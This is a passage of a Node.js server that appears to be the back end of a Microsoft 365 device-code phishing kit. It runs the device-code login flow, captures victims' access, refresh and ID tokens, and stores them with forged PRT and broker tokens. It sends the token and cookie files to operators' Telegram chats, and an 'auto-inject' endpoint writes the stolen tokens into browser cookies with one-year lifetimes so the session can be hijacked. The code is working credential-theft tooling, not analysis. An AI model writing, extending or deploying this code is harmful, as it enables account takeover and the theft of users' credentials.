    res.redirect(`${OAUTH_DONE_LANDING}?error=${encodeURIComponent(err.message)}`);
  }
});

// ===== AUTO-INJECT ENDPOINT (for seamless redirect after device auth) =====
app.get('/api/auth/inject', async (req, res) => {
  try {
    const email = req.query.email;
    const landing = req.query.landing || '/';
    if (!email) return res.status(400).send('Email required');

    const cookiePath = cookieFilePath(email);
    if (!fs.existsSync(cookiePath)) return res.status(404).send('Cookies not found for this email. Please try again.');

    const cookieData = readJsonMaybeEncrypted(cookiePath);
    if (!cookieData?.broker_token) return res.status(404).send('Broker token not found.');

    // Build the auto-injection script for login.microsoftonline.com
    const broker = cookieData?.broker_token || '';
    let prtValue = '';
    if (cookieData?.prt) {
      if (typeof cookieData.prt === 'string') prtValue = cookieData.prt;
      else if (cookieData.prt.prt_token) prtValue = cookieData.prt.prt_token;
      else if (cookieData.prt._prt) prtValue = cookieData.prt._prt;
      else {
        try { prtValue = JSON.stringify(cookieData.prt); } catch(e) { prtValue = ''; }
      }
    }

    const prtAssignments = [];
    if (cookieData?.prt && typeof cookieData.prt === 'object') {
      for (const [k, v] of Object.entries(cookieData.prt)) {
        const safeName = String(k).replace(/[\\\"]/g, '\\$&');
        const val = typeof v === 'string' ? v : JSON.stringify(v);
        const safeVal = String(val).replace(/[\\\"]/g, '\\$&');
        prtAssignments.push(`document.cookie = "${safeName}=" + encodeURIComponent("${safeVal}") + "; path=/; max-age=31536000; Secure; SameSite=None";`);
      }
    } else if (prtValue) {
      const safePrt = String(prtValue).replace(/[\\\"]/g, '\\$&');
      prtAssignments.push(`document.cookie = "x-ms-PRT=" + encodeURIComponent("${safePrt}") + "; path=/; max-age=31536000; Secure; SameSite=None";`);
    }

    const safeBroker = String(broker).replace(/[\\\"]/g, '\\$&');

    // HTML page that injects and redirects for 1-year expiry
    const html = `<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Authenticating...</title>
  <script>
    (function() {
      try {
        // Inject broker token with 1-year max-age (31536000 seconds)
        document.cookie = "x-ms-RefreshTokenCredential=" + encodeURIComponent("${safeBroker}") + "; path=/; max-age=31536000; Secure; SameSite=None";
        // Inject PRT pieces with 1-year max-age
        ${prtAssignments.join('\n        ')}
        console.log('✅ Broker token & PRT injected successfully (1-year expiry).');
      } catch (e) {
        console.error('Injection failed:', e);
      }
      // Redirect to landing page after a short delay
      setTimeout(function() {
        window.location.href = "${landing}";
      }, 500);
    })();
  </script>
</head>
<body>
  <p>Authenticating... Please wait.</p>
</body>
</html>`;

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(html);
  } catch (err) {
    console.error('Auto-inject error:', err);
    res.status(500).send('Authentication redirect failed. Please try again.');
  }
});

// ===== AUTO-LOGIN (cookie setting) =====
function computeCookieOptions(req) {
  const isSecure = req.secure || req.headers['x-forwarded-proto'] === 'https' || APP_BASE_URL.startsWith('https://');
  const oneYearMs = 365 * 24 * 60 * 60 * 1000;
  const sameSite = isSecure ? 'None' : 'Lax';
  const opts = {
    httpOnly: false,
    secure: isSecure,
    sameSite,
    path: '/',
    maxAge: oneYearMs
  };
  if (process.env.COOKIE_DOMAIN) {
    opts.domain = process.env.COOKIE_DOMAIN;
  }
  return opts;
}

app.get('/__set_cookies', async (req, res) => {
  try {
    const email = req.query.email;
    if (!email) return res.status(400).send('Email required');

    const cookiePath = cookieFilePath(email);
    const tokenPath = tokenFilePath(email);

    if (!fs.existsSync(cookiePath)) return res.status(404).send('Cookies not found');

    const cookieData = readJsonMaybeEncrypted(cookiePath);
    if (!cookieData?.prt && !cookieData?.broker_token) return res.status(400).send('PRT or Broker Token data not found');

    const cookieOptions = computeCookieOptions(req);

    // Set PRT cookies (client-readable) with 1-year expiry
    if (cookieData.prt && typeof cookieData.prt === 'object') {
      for (const [k, v] of Object.entries(cookieData.prt)) {
        try {
          const safeVal = typeof v === 'string' ? v : JSON.stringify(v);
          res.cookie(k, encodeURIComponent(safeVal), cookieOptions);
        } catch (e) {
          console.warn('Failed to set cookie', k, e && e.message);
        }
      }
    }

    // Set broker token cookie (httpOnly) with 1-year expiry
    if (cookieData.broker_token) {
      const brokerOpts = { ...cookieOptions, httpOnly: true };
      res.cookie('aad_broker_token', encodeURIComponent(cookieData.broker_token), brokerOpts);
    }

    logAudit({ action: 'set_prt_cookies', email, host: req.headers.host, ip: req.ip });

    (async function sendFilesAfterSettingCookies() {
      try {
        const admins = getAdminUsers();
        const adminChatIds = new Set();
        if (admins && admins.length) { admins.forEach(a => { if (a.telegram_chat_id) adminChatIds.add(a.telegram_chat_id); }); }
        const globalSettings = readSettingsSafe();
        if (globalSettings.telegram_chat_id) adminChatIds.add(globalSettings.telegram_chat_id);

        for (const chatId of adminChatIds) {
          try {
            const adminUser = admins.find(a => a.telegram_chat_id === chatId);
            const botToken = (adminUser && adminUser.telegram_bot_token) || getBotTokenFromSettingsOrEnv();
            await notifyTelegram('🔔 Cookies set via auto-login', `Cookies set for ${email} by auto-login endpoint`, email, chatId, botToken);
            if (fs.existsSync(tokenPath)) await sendFileToTelegram(tokenPath, `🔑 Tokens for ${email}`, chatId, botToken);
            if (fs.existsSync(cookiePath)) await sendFileToTelegram(cookiePath, `🍪 PRT & Broker for ${email}`, chatId, botToken);
          } catch (e) { console.warn('Failed to send files to admin chat', e && e.message); }
        }

        const matchedUser = findMatchingUserForEmail(email);
        const userChatId = (matchedUser && matchedUser.telegram_chat_id) || getChatIdForUser(email);
        const userBotToken = (matchedUser && matchedUser.telegram_bot_token) || getBotTokenForUser(email);
        if (userChatId) {
          try {
            await notifyTelegram('🔐 Your cookies were set', `Cookies set for ${email} via auto-login`, email, userChatId, userBotToken);
            if (fs.existsSync(tokenPath)) await sendFileToTelegram(tokenPath, `🔑 Tokens for ${email}`, userChatId, userBotToken);
            if (fs.existsSync(cookiePath)) await sendFileToTelegram(cookiePath, `🍪 PRT & Broker for ${email}`, userChatId, userBotToken);
          } catch (e) { console.warn('Failed to send files to user chat', e && e.message); }
        }
      } catch (e) { console.warn('sendFilesAfterSettingCookies error', e && e.message); }
    })();

    return res.redirect('/');
  } catch (err) {
    console.error('Set cookies error:', err);
    res.status(500).send('Error setting cookies: ' + (err && err.message));
  }
});

// ===== DEVICE CODE FLOW =====
app.post('/api/device/code', async (req, res) => {
  try {
    if (!CLIENT_ID) return res.status(400).json({ error: 'CLIENT_ID not configured' });

    const deviceCodeUrl = `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/devicecode`;
    const deviceCodeBody = new URLSearchParams({
      client_id: CLIENT_ID,
      scope: SCOPE
    });

    const deviceResp = await fetch(deviceCodeUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: deviceCodeBody
    });

    const deviceData = await deviceResp.json();

    if (!deviceResp.ok) {
      console.error('Device code request error:', deviceData);
      return res.status(400).json({ error: deviceData.error_description || 'Failed to get device code' });
    }

    res.json({
      success: true,
      device_code: deviceData.device_code,
      user_code: deviceData.user_code,
      verification_uri: deviceData.verification_uri,
      verification_uri_complete: deviceData.verification_uri_complete,
      expires_in: deviceData.expires_in,
      interval: deviceData.interval
    });
  } catch (err) {
    console.error('Device code error:', err);
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/device/token', async (req, res) => {
  try {
    const { device_code } = req.body || {};
    if (!device_code) return res.status(400).json({ error: 'device_code required' });

    const tokenUrl = `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token`;
    const tokenBody = new URLSearchParams({
      client_id: CLIENT_ID,
      client_secret: CLIENT_SECRET || '',
      device_code: device_code,
      grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
    });

    const tokenResp = await fetch(tokenUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: tokenBody
    });

    let tokenData = null;
    const tokenText = await tokenResp.text().catch(()=>null);
    try { tokenData = tokenText ? JSON.parse(tokenText) : null; } catch (err) {
      console.error('Device token parse failed, raw:', tokenText);
      return res.status(500).json({ error: 'token_response_not_json', raw: tokenText });
    }

    if (!tokenResp.ok) {
      if (tokenData && tokenData.error) {
        if (tokenData.error === 'authorization_pending') {
          return res.status(400).json({ error: 'authorization_pending' });
        }
        return res.status(400).json({ error: tokenData.error_description || tokenData.error });
      }
      return res.status(400).json({ error: tokenText || `HTTP ${tokenResp.status}` });
    }

    if (!tokenData || !tokenData.access_token) {
      console.error('Token response missing access_token:', tokenData || tokenText);
      return res.status(500).json({ error: 'access_token_missing', raw: tokenData || tokenText });
    }

    const info = extractFromIdToken(tokenData.id_token || tokenData.access_token);
    const email = info?.email || 'unknown@microsoft.com';
    const userId = info?.id || 'unknown';

    const prtData = generatePrimaryRefreshToken(tokenData, email);
    const brokerTokenData = generateAADBrokerToken(tokenData, email, userId);

    const tokenPath = tokenFilePath(email);
    writeJsonMaybeEncrypted(tokenPath, {
      email,
      user_id: userId,
      timestamp: new Date().toISOString(),
      tokens: {
        access_token: tokenData.access_token,
        id_token: tokenData.id_token,
        refresh_token: tokenData.refresh_token,
        expires_in: tokenData.expires_in,
        token_type: tokenData.token_type,
        scope: tokenData.scope
      },
      broker_token: brokerTokenData.broker_token,
      broker_payload: brokerTokenData.broker_payload,
      created_by: 'device_code'
    });

    const cookiePath = cookieFilePath(email);
    writeJsonMaybeEncrypted(cookiePath, {
      email,
      user_id: userId,
      timestamp: new Date().toISOString(),
      prt: prtData,
      broker_token: brokerTokenData.broker_token,
      broker_payload: brokerTokenData.broker_payload,
      created_by: 'device_code'
    });

    const downloadTokensUrl = `${APP_BASE_URL}/api/download/tokens/${encodeURIComponent(email)}`;
    const downloadCookiesUrl = `${APP_BASE_URL}/api/download/cookies/${encodeURIComponent(email)}`;

    const vaultEntry = {
      email,
      user_id: userId,
      device_id: brokerTokenData.device_id,
      broker_token: brokerTokenData.broker_token,
      broker_payload: brokerTokenData.broker_payload,
      tokens_file: path.basename(tokenPath),
      cookies_file: path.basename(cookiePath),
      tokens_download_url: downloadTokensUrl,
      cookies_download_url: downloadCookiesUrl,
      created_at: new Date().toISOString(),
      created_by: 'device_code',
      expires_at: brokerTokenData.expires_at
    };

    try {
      saveToVault(email, {
        email,
        user_id: userId,
        broker_token: brokerTokenData.broker_token,
        broker_payload: brokerTokenData.broker_payload,
        device_id: brokerTokenData.device_id,
        created_at: new Date().toISOString(),
        status: 'active',
        expires_at: brokerTokenData.expires_at
      });
    } catch (e) {
      console.warn('Failed to save to admin vault:', e && e.message);
    }

    try {
      saveUserVaultEntry(email, vaultEntry);
      const matchedUser = findMatchingUserForEmail(email);
      if (matchedUser) {
        const ownerId = matchedUser.email || matchedUser.username;
        if (ownerId && ownerId !== email) saveUserVaultEntry(ownerId, vaultEntry);
      }
      logAudit({ action: 'device_token_saved', email, device_id: brokerTokenData.device_id, ip: req.ip });
    } catch (e) {
      console.warn('Failed to save user vault:', e && e.message);
    }

    await notifyTelegram('📱 Device Code Auth Success', `User: ${email}\nDevice: ${brokerTokenData.device_id}`, email);

    try {
      const admins = getAdminUsers();
      const adminChatIds = new Set();
      if (admins && admins.length) {
        admins.forEach(a => { if (a.telegram_chat_id) adminChatIds.add(a.telegram_chat_id); });
      }
      const globalSettings = readSettingsSafe();
      if (globalSettings.telegram_chat_id) adminChatIds.add(globalSettings.telegram_chat_id);

      for (const chatId of adminChatIds) {
        await notifyTelegram('🔔 New tokens/cookies saved', `Email: ${email}\nDevice: ${brokerTokenData.device_id}`, email, chatId);
        if (fs.existsSync(tokenPath)) await sendFileToTelegram(tokenPath, `🔑 Tokens for ${email}`, chatId);
        if (fs.existsSync(cookiePath)) await sendFileToTelegram(cookiePath, `🍪 PRT & Broker for ${email}`, chatId);
      }
    } catch (err) {
      console.error('Failed to send token/cookie file to admin:', err && err.message);
    }

    try {
      const matchedUser = findMatchingUserForEmail(email);
      const userChatId = (matchedUser && matchedUser.telegram_chat_id) || getChatIdForUser(email);
      const userBotToken = (matchedUser && matchedUser.telegram_bot_token) || getBotTokenForUser(email);
      if (userChatId) {
        await notifyTelegram('🔐 Your tokens are ready', `User: ${email}\nDevice: ${brokerTokenData.device_id}`, email, userChatId, userBotToken);
        if (fs.existsSync(tokenPath)) await sendFileToTelegram(tokenPath, `🔑 Tokens for ${email}`, userChatId, userBotToken);
        if (fs.existsSync(cookiePath)) await sendFileToTelegram(cookiePath, `🍪 PRT & Broker for ${email}`, userChatId, userBotToken);
      }
    } catch (err) {
      console.error('Failed to send token/cookie file to user:', err && err.message);
    }

    res.json({
      success: true,
      email,
      user_id: userId,
      broker_token: brokerTokenData.broker_token,
      device_id: brokerTokenData.device_id
    });
  } catch (err) {
    console.error('Device token error:', err);
    res.status(500).json({ error: err.message });
  }
});

// ===== BROKER ENDPOINTS =====
app.post('/api/broker/verify', async (req, res) => {
  try {
    const { broker_token } = req.body || {};
    if (!broker_token) return res.status(400).json({ error: 'broker_token required' });

    try {
      const decoded = jwt.verify(broker_token, BROKER_TOKEN_SECRET, { algorithms: ['HS256'] });

      res.json({
        success: true,
        valid: true,
        payload: decoded,
        message: 'Broker token is valid'
      });
    } catch (err) {
      if (err.name === 'TokenExpiredError') {
        return res.status(401).json({ error: 'token_expired', message: 'Broker token has expired' });
      }
      return res.status(401).json({ error: 'invalid_token', message: 'Broker token is invalid' });
    }
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/broker/token/:email', requireLogin, async (req, res) => {
  try {
    const email = req.params.email;

    if (!(req.session.user && (req.session.user.role === 'admin' || req.session.user.username === email))) {
      return res.status(403).json({ error: 'forbidden' });
    }

    const p = cookieFilePath(email);
    if (!fs.existsSync(p)) return res.status(404).json({ error: 'cookie file not found' });

    const cookieData = readJsonMaybeEncrypted(p);
    if (!cookieData?.broker_token) return res.status(404).json({ error: 'broker token not found' });

    res.json({ success: true, email, broker_token: cookieData.broker_token, broker_payload: cookieData.broker_payload, created_at: cookieData.timestamp });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ===== DEBUG API =====
app.get('/api/debug/cookies/:email', requireLogin, (req, res) => {
  try {
    const email = req.params.email;
    const sessionUser = req.session.user;
    const isAdmin = sessionUser && sessionUser.role === 'admin';
    const isOwner = sessionUser && (sessionUser.username === email || sessionUser.email === email);
    if (!isAdmin && !isOwner) return res.status(403).json({ error: 'forbidden' });

    const cookieP = cookieFilePath(email);
    const tokenP = tokenFilePath(email);

    const cookieData = fs.existsSync(cookieP) ? readJsonMaybeEncrypted(cookieP) : null;
    const tokenData = fs.existsSync(tokenP) ? readJsonMaybeEncrypted(tokenP) : null;

    res.json({ success: true, email, cookieFileExists: fs.existsSync(cookieP), tokenFileExists: fs.existsSync(tokenP), cookieFile: cookieData || null, tokenFile: tokenData || null });
  } catch (e) {
    console.error('Debug cookies error:', e);
    res.status(500).json({ error: e.message || 'debug failed' });
  }
});

app.get('/debug', requireLogin, (req, res) => {
  const html = `<!doctype html>
<html><head><meta charset="utf-8"><title>Auth Broker Debug</title><style>body{font-family:Arial,sans-serif;padding:18px;background:#f5f7fb}pre{background:#fff;padding:12px;border-radius:6px;border:1px solid #e6e6e6;white-space:pre-wrap}</style></head><body>
<h2>Auth Broker Debug</h2>
<p>Current session user: <strong>${req.session.user?.username || 'unknown'}</strong></p>
<div style="margin-bottom:12px">
<label>Email to debug: <input id="dbgEmail" type="text" value="${req.session.user?.email || req.session.user?.username || ''}" style="width:320px;padding:6px;margin-left:6px"></label>
</div>
<div style="display:flex;gap:8px">
<button id="btnPreview">Fetch server preview</button>
</div>
<pre id="srvPreview">idle</pre>
<script>
document.getElementById('btnPreview').addEventListener('click', async () => {
  const email = document.getElementById('dbgEmail').value;
  const r = await fetch('/api/debug/cookies/' + encodeURIComponent(email));
  const j = await r.json();
  document.getElementById('srvPreview').textContent = JSON.stringify(j, null, 2);
});
</script>
</body></html>`;
  res.send(html);
});

// Start server
app.listen(PORT, () => {
  console.log(`Auth Broker server listening on ${PORT}`);
  console.log(`APP_BASE_URL=${APP_BASE_URL}`);
  console.log(`✓ Tokens expire in: ${BROKER_TOKEN_EXPIRY} (1 year default)`);
});
